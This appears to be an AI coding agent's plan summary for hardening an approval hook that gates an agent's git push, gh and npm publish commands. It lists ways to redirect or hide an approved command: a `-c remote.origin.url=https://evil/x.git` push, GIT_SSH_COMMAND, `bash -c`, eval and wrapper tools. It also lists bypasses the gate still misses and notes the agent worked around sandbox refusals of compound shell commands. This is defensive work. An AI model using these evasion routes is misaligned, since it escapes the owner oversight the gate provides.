---
phase: 04-profiles-retrieval-budgets-restricted-mode-and-the-portabili
plan: 51
subsystem: security
tags: [attended-hook, privileged-commands, approvals, binding, shell-recursion, npm-subcommand, enforcement-map, cr-03, wr-01, wr-03, wr-04, in-03]
requires:
  - phase: 04-40
    provides: classifyLine, the shell-faithful scanner, programWords with MAX_PREFIX_WORDS, the differential oracle
  - phase: 04-48
    provides: attended per-command consumption under a savepoint
provides:
  - "params gitOptions, env and line on every privileged command, and cwd on every attended one: an approval binds the command, the line and the directory the owner saw"
  - "shell -c and eval recursion, the wrappers timeout, xargs, setsid, stdbuf, ionice and flock, and the NPM_COMMANDS subcommand table"
  - "UNAPPROVABLE_RULE (privileged:unapprovable): a gh api body from a file or standard input is denied with no request"
  - "the privileged-approval enforcement-map row rewritten from the code, with a tracked proof and a pinned map order"
affects: [04-52, 04-53]
actuals:
  tokens: 49950
  tasks: 3
  commits: 6
plan_head_before: ed90bc762b2be807c1e5d28d8cf79ddc0d7508fd
plan_head_after: 606c69b3cde8770dea4c2dc5bb866011a891bf03
tech-stack:
  added: []
  patterns:
    - "an approval authorizes the command the owner saw: options by name, redirecting inputs verbatim, the exact line by digest, the directory by canonical path"
    - "a classifier that cannot bind what a command does refuses it (unapprovable) instead of approving it blind"
key-files:
  created:
    - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-51-red-task1.json
    - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-51-red-task2.json
    - .planning/phases/04-profiles-retrieval-budgets-restricted-mode-and-the-portabili/04-51-red-task3.json
  modified:
    - src/domain/privileged-commands.ts
    - src/hook/pre-tool-use.ts
    - src/domain/enforcement-map.ts
    - test/unit/privileged-commands.test.ts
    - test/integration/hook-privileged.test.ts
    - test/unit/enforcement-map.test.ts
    - test/helpers/shell-oracle.ts
key-decisions:
  - "gitOptions, env and line are bound rather than the redirected forms refused: the owner can still approve `git -C other push`, but only that exact command, from that exact directory"
  - "line is added by classifyLine, so the run path's params carry it too; classifyShellCommand, which sees one command and not the line, adds none"
  - "A shell string or eval is classified by the same scanner one level deeper (the start depth of commandsOf), so the nesting limit of 8 covers shell strings and the substitutions inside them together"
  - "npm's subcommand is the first positional that npm itself would resolve to a command, including its unambiguous abbreviations (`npm pub`); the option table lists the options that take a value so a value that names a command (`--prefix test`, `--loglevel info`) is skipped"
  - "An unapprovable command denies the whole line before any request is made or approval consumed, and records one policy.denied for each such command"
requirements-completed: [FR-12, SEC-6]
coverage:
  - id: D1
    description: "After the owner approves `git push origin main` and `gh pr create --base main` from /tmp in session s1, the -c, -C, GIT_SSH_COMMAND, cd, GH_REPO and other-directory forms are each denied with a new request and leave both approvals unconsumed; the exact approved lines are then allowed once"
    requirement: FR-12
    verification:
      - kind: integration
        ref: "test/integration/hook-privileged.test.ts#tracer: an approval is spent only on the command the owner saw, run where they saw it (CR-03, FR-12, T-04-136)"
        status: pass
      - kind: unit
        ref: "test/unit/privileged-commands.test.ts#a push redirected by a git global option is not the plain push (CR-03, FR-12, T-04-136)"
        status: pass
    human_judgment: false
  - id: D2
    description: "gitOptions, env (assignments and env-wrapper options) and the line digest are carried on every privileged command, and the request summary shows them with the directory and cuts a long value with an ellipsis while the digest binds the full value"
    requirement: FR-12
    verification:
      - kind: unit
        ref: "test/unit/privileged-commands.test.ts#the line digest binds everything else on the line (CR-03, FR-12, T-04-136)"
        status: pass
      - kind: integration
        ref: "test/integration/hook-privileged.test.ts#the approval request shows what it binds, and a value cut for display ends with an ellipsis (CR-03, FR-12 precision)"
        status: pass
    human_judgment: false
  - id: D3
    description: "A privileged or unparseable attended call with no cwd, a relative, non-string or nonexistent cwd, or a file for a cwd exits 2"
    requirement: FR-12
    verification:
      - kind: integration
        ref: "test/integration/hook-privileged.test.ts#an attended call that needs a decision and has no usable directory fails closed (CR-03, FR-12)"
        status: pass
    human_judgment: false
  - id: D4
    description: "bash -c, sh -c, eval, timeout, xargs, setsid, stdbuf, ionice and flock (both forms) are classified as the push or publish they start; a computed string stays unclassified; and bash and zsh agree on the extended oracle corpus"
    requirement: FR-12
    verification:
      - kind: unit
        ref: "test/unit/privileged-commands.test.ts#a shell started on a literal string, eval and the wrappers run the command they are given (WR-01, T-04-137)"
        status: pass
      - kind: unit
        ref: "test/unit/privileged-commands.test.ts#the differential oracle: every privileged command a shell runs on the corpus is one classifyLine returns (T-04-106)"
        status: pass
      - kind: integration
        ref: "test/integration/hook-privileged.test.ts#a push started through a shell string, eval or a wrapper is denied like the push itself (WR-01, WR-03, T-04-137)"
        status: pass
    human_judgment: false
  - id: D5
    description: "npm publish is found after any option and only as the subcommand: `npm --scope @x publish`, `--fetch-retries 3` and `--cwd pkg` are release.publish; `npm install publish` and `npm view publish` are not privileged"
    requirement: FR-12
    verification:
      - kind: unit
        ref: "test/unit/privileged-commands.test.ts#npm publish is found after any option, and only as the subcommand (WR-03, T-04-137)"
        status: pass
    human_judgment: false
  - id: D6
    description: "gh api with --input or a -F/--field value starting with @ is denied in an attended session with privileged:unapprovable, no request and one policy.denied; inline fields are approvable with different digests; a run still denies the forms as privileged:scm.api.write"
    requirement: FR-12
    verification:
      - kind: integration
        ref: "test/integration/hook-privileged.test.ts#a gh api body that comes from a file or standard input is refused, not approved blind (WR-04, T-04-138)"
        status: pass
      - kind: unit
        ref: "test/unit/privileged-commands.test.ts#gh api forms whose body cannot be bound are marked unapprovable (WR-04, T-04-138)"
        status: pass
    human_judgment: false
  - id: D7
    description: "The privileged-approval row of the enforcement map says the hook classifies every command and consumes one approval per privileged command, names the seven covered forms as a closed list and the residual bypasses, and names a tracked test; the map keeps its specified order and the duplicate-id and empty-cell checks still pass"
    requirement: SEC-6
    verification:
      - kind: unit
        ref: "test/unit/enforcement-map.test.ts#the privileged-approval row says what the gate does and does not do (SEC-6, IN-03, plan 04-51)"
        status: pass
      - kind: unit
        ref: "test/unit/enforcement-map.test.ts#the enforcement map keeps its specified order (SEC-6 ordering, plan 04-51)"
        status: pass
    human_judgment: false
duration: 19min
completed: 2026-11-22
status: complete
---

# Phase 4 Plan 51: An approval authorizes the command the owner saw, and nothing that redirects it Summary

**The attended gate now binds git's global options, the env prefix, the exact line and the working directory into each approval digest, reads through `bash -c`, `eval` and six more wrappers and npm's subcommand table, refuses a `gh api` body it cannot bind, and the enforcement-map row says exactly that and no more (CR-03, WR-01, WR-03, WR-04, IN-03).**

## Performance

- **Duration:** about 19 min from the recorded start (the start time was recorded after the first reads)
- **Started:** 2026-11-22T22:40:04Z
- **Completed:** 2026-11-22T22:59Z
- **Tasks:** 3 (one tracer, two auto), each with a committed failing test first
- **Files:** 10 changed in the task commits (3 source files, 4 test files, 3 red records)

## Accomplishments

- **Tracer, CR-03.** `classifyGit` keeps the global option words it skips, with their values, as `gitOptions`. `programWords` returns the assignment words before the program and an `env` wrapper's options and assignments, verbatim and in order; every privileged command carries them as `env`. `classifyLine` adds `line` (`sha256:` and the first 32 hex digits of the SHA-256 of the exact command text) to every command. `attendedPreToolUse` resolves the hook input's cwd with `canonicalAbsolute`, requires an existing directory, and adds it as `cwd` to every command before the digest, the summary, consumption and requests. The verifier's reproduction (`git -c remote.origin.url=... push` with the plain push's params) now has other params and a `gitOptions` of `-c remote.origin.url=https://evil/x.git`. After approving the plain push and the plain `gh pr create` from `/tmp`, the `-c`, `-C`, `GIT_SSH_COMMAND`, earlier `cd`, `GH_REPO` and other-directory forms are each denied with a new request and both approvals stay unconsumed; the exact lines are then allowed once. A directory given as a symbolic link binds as the path it resolves to.
- **Classification, WR-01 and WR-03.** A shell (`sh`, `bash`, `zsh`, `dash`, `ksh`, with options such as `-lc`, `-o name`, `--norc`) given `-c` and a literal string, and `eval` over its joined words, are scanned by the same scanner one level deeper (`commandsOf` takes a start depth). A computed string (`bash -c "$X"`, `sh -c "$(cat f)"`) classifies as none; the commands of its substitution were already scanned with the line. An unreadable inner string is unparseable. `timeout` (duration operand), `xargs`, `setsid`, `stdbuf`, `ionice` and `flock` (lock file before or after `-c`; the string form becomes `sh -c`) are wrappers; the outer assignments are merged in front of the inner command's env. `NPM_COMMANDS` maps npm's commands and aliases to the command each runs; the subcommand is the first positional that resolves (exactly, or as the one command every name starting with the word resolves to, so `npm pub` is publish), and the value-taking options npm knows are skipped with their values.
- **Unapprovable, WR-04.** `gh api` with `--input`, or a `-F`/`--field` value starting with `@` (`name=@file`, `name=@-`), sets `unapprovable` on the command. The attended hook denies the whole line before any request or consumption with `privileged:unapprovable` and a reason that names the file or standard input and says to pass fields inline; one `policy.denied` (action, scope, tool, reason, no command text) is recorded per such command. Inline `-f`/`-F` fields stay approvable, and two different inline queries have different digests because of `line`. A run is unchanged: the same forms are denied as `privileged:scm.api.write`.
- **Enforcement map, SEC-6 and IN-03.** The `privileged-approval` row keeps its id and its place between `budgets` and `approval-single-use`. Its `avariceRole` and `bypassLimitation` are rewritten from the code (see the documentation surfaces) and its proof is `test/integration/hook-privileged.test.ts`. `enforcement-map.test.ts` pins the full ordered id list and the row's content; the duplicate-id and empty-cell cases still pass.

## TDD record

| Task | RED commit | RED evidence (`RED_EVIDENCE_OK`) | GREEN commit |
|---|---|---|---|
| 1 | `eb9b5f7` | `04-51-red-task1.json`: the target unit test failed its `notDeepEqual` because the `-c` push and the plain push had equal params (`{ remote: 'origin', refspec: 'main' }`) | `d027730` |
| 2 | `360dbb0` | `04-51-red-task2.json`: `bash -c 'git push a; npm publish'` classified as none (deepEqual of `[]` and `['git.push','release.publish']`); the oracle also failed under bash and zsh | `d548047` |
| 3 | `51633f3` | `04-51-red-task3.json`: the attended hook offered an approval request for `gh api graphql -F query=@q.graphql` (privileged:scm.api.write) instead of denying it as privileged:unapprovable | `606c69b` |

No REFACTOR commits. The task 2 RED commit carries an empty `NPM_COMMANDS` and the task 3 RED commit an `UNAPPROVABLE_RULE` and an optional `unapprovable` field as skeletons, so the unit file loads and typechecks (the same device plan 04-40 used). Two new tests are regression pins that passed on first run: the ordered id list of the enforcement map and the typed-out alias cases that already held; the RED targets are other tests of the same commits.

## Verification

- `node --test test/unit/privileged-commands.test.ts test/integration/hook-privileged.test.ts test/unit/enforcement-map.test.ts test/integration/untrusted-authority.test.ts` plus `test/integration/hook.test.ts`, `test/unit/hook-decision.test.ts`, `test/mutation/fail-closed.test.ts`, `test/fault/privileged-no-replay.test.ts`, `test/integration/approvals.test.ts`, `test/integration/install-host.test.ts`, `test/unit/approval.test.ts` and `test/unit/action-class.test.ts`: 546 of 546 pass. `test/unit/policy-precedence.test.ts`, `test/unit/notify-policy.test.ts`, `test/integration/restricted-mode.test.ts`, `test/integration/run-silence.test.ts` and `test/integration/manual-equivalents.test.ts`: 207 of 207 pass.
- The oracle corpus gained 23 lines (shell strings, eval, the wrappers, computed strings, npm cases) and passes under bash and zsh with `sh`, `timeout`, `xargs`, `setsid`, `stdbuf`, `ionice` and `flock` stubs in the stub directory.
- `npm run typecheck` clean; `npm run check:boundaries` ok (132 files). The full `npm test` suite was not run (over an hour here), as instructed.
- Acceptance greps: `gitOptions` 2 matches and `canonicalAbsolute(` 7 in the hook (the attended path calls it through `attendedCwd`); `NPM_COMMANDS` 3 matches; `UNAPPROVABLE_RULE` 3 in the hook; `hook-privileged.test.ts` 1 in the map.

## Deviations from Plan

### Auto-fixed Issues

**1. [Rule 1 - Bug] A test of plan 04-48 premised on approvals not binding the line**
- **Found during:** Task 1
- **Issue:** `with two usable approvals granted at different times, one command takes the earlier and leaves the later` granted two approvals for the line `git push origin main; git push origin main` and then ran the bare `git push origin main`, expecting it to take the earlier one. Binding the line makes those approvals usable only by that line, which is the intended effect of CR-03.
- **Fix:** the test now asserts that the bare command does not take them, then runs the original line and reads the oldest-first order from the two `action.started` events.
- **Files modified:** `test/integration/hook-privileged.test.ts`
- **Commit:** `d027730`

**2. [Rule 1 - Bug] Run-path and attended digest assertions of plan 04-19 expected params without `line` and `cwd`**
- **Found during:** Task 1 (RED)
- **Issue:** two tests compared `paramsDigest` with the old parameter objects; the classification table also expected identical params across spellings.
- **Fix:** the digests now include `line` (and `cwd` for the attended one); the table compares the target and options with `line`, `gitOptions` and `env` left out and a new test asserts that spellings that change the effect change the params, as the plan states.
- **Files modified:** `test/integration/hook-privileged.test.ts`
- **Commit:** `eb9b5f7`

**3. [Method] The oracle line `bash -lc '...'` replaced by `bash -c '...'`**
- **Found during:** Task 2
- **Issue:** a login shell sources `/etc/profile`, which on macOS resets PATH, so the stub programs are not found and the shell performs no push. The classification of `-lc` is covered by a unit test.
- **Commit:** `d548047`

**Total deviations:** 2 auto-fixed (both Rule 1, tests made stale by the intended change), 1 method note. **Impact:** none on scope.

## Documentation surfaces (for plan 04-53)

- **Bound parameters and what they mean to the owner.** Every privileged command's approval is bound to: its target and the names of its options (unchanged); `gitOptions`, git's global option words before the subcommand with their values (`-C dir`, `-c name=value`, `--git-dir=...`); `env`, the assignment words before the program plus the options and assignments given to an `env` wrapper, verbatim and in order, every name (HOME and XDG_CONFIG_HOME steer git and gh too); `line`, `sha256:` and the first 32 hex digits of the SHA-256 of the exact command text, which binds an earlier `cd`, `git config`, wrapper options, `--receive-pack` and a `gh api` inline body to the command the owner saw; and, for an attended call, `cwd`, the canonical path of the hook input's directory. The request summary (`avarice approve`) shows gitOptions, env, line and cwd when present; a value longer than 80 characters, or a summary longer than 400, ends with `…`, and the digest binds the full values.
- **Fail closed on the directory.** A privileged or unparseable attended call whose hook input has no absolute, existing directory in `cwd` exits 2 (stderr `avarice hook: a privileged call needs the hook input cwd ...`), like one without a session ID.
- **Rule `privileged:unapprovable`.** Attended only. A `gh api` command with `--input`, or a `-F`/`--field` value starting with `@`, is classified `scm.api.write` but unapprovable. The hook denies the whole line before any request or consumption: reason `avarice: privileged:unapprovable: the request body comes from a file or standard input, which an approval cannot bind; pass the fields inline with -f name=value or -F name=value`; one `policy.denied` per such command (data: `ruleId`, `action`, `scope`, `tool`, `reason`, `source`; no `approval.requested`, no command text). A run keeps denying the same forms as `privileged:scm.api.write`.
- **Forms now classified.** `sh`, `bash`, `zsh`, `dash` and `ksh` with a literal `-c` string (options before it are skipped, `-o`, `+o`, `-O`, `+O`, `--rcfile` and `--init-file` take a value); `eval` (its words joined by a space); wrappers `timeout` (options, then the duration), `xargs` (valued options), `setsid`, `stdbuf`, `ionice` and `flock` (options, lock file, then the command or a `-c` string); `npm` publish after any option, found as the first positional that is an npm command (`NPM_COMMANDS`, with unambiguous abbreviations such as `npm pub`), so `npm install publish` and `npm view publish` are not privileged. The string is read one nesting level deeper, within the existing limit of 8; an unreadable string is `privileged:unparseable`.
- **Residual bypasses (the flagged assumption).** Names built at run time (variables, aliases, functions, scripts, a shell started on a computed string, text piped into a shell), and repository or shell state changed by an earlier separate call (a remote's URL, git config, an exported variable); the SCM platform's own protections remain authoritative there. This narrows accepted bypass AR-04-02 (T-04-53) without replacing it. Also: an npm option missing from the table whose value names an npm command can hide the subcommand, and a line over the limits is refused rather than read.
- **Enforcement-map row.** `privileged-approval` (enforcer host, id and position unchanged): role "classifies every command of a Bash call and consumes one approval per privileged command, bound to the command's parameters, the exact line and the directory it runs in; a command no approval can bind is denied with no request"; bypass "covers only these forms: git push, gh pr create, gh pr merge, gh pr edit, gh release create, gh api with a method other than GET, and npm publish; every other command, including the other gh and git forms, is not seen" plus the residuals above and the removed-hook and outside-the-host limits; proof `test/integration/hook-privileged.test.ts`. The map's id order is pinned by a test.
- **Run digests changed.** A run's approval for a privileged form now also binds `line` (and `gitOptions`/`env` when present), so an approval requested before this change no longer matches; requests are minted per digest.
- **Commits to cite (plan 04-52).** `d027730` (CR-03), `d548047` (WR-01, WR-03), `606c69b` (WR-04, IN-03, SEC-6).
- **docs/system.** Not edited by this plan, as with plans 04-40 and 04-48: the phase's documentation plan (04-53) writes the matching `docs/system/` documents from the code and the surfaces above.

## Known Stubs

None.

## Threat Flags

None. T-04-136 to T-04-139 are mitigated as planned; no new endpoint, auth path or schema (the `policy.denied` event gains an `action` field on the new `privileged:unapprovable` denial).

## Issues Encountered

None. The sandbox refused several compound shell commands (heredocs holding command text, subshells); the edits were made with the file tools and small scripts kept outside the repository.

## Self-Check: PASSED

- `src/domain/privileged-commands.ts`, `src/hook/pre-tool-use.ts`, `src/domain/enforcement-map.ts`, the four test files and the three `04-51-red-task*.json` records exist.
- Commits `eb9b5f7`, `d027730`, `360dbb0`, `d548047`, `51633f3` and `606c69b` are ancestors of HEAD; the plan has 6 commits measured from the ledger (`ed90bc7..606c69b`).
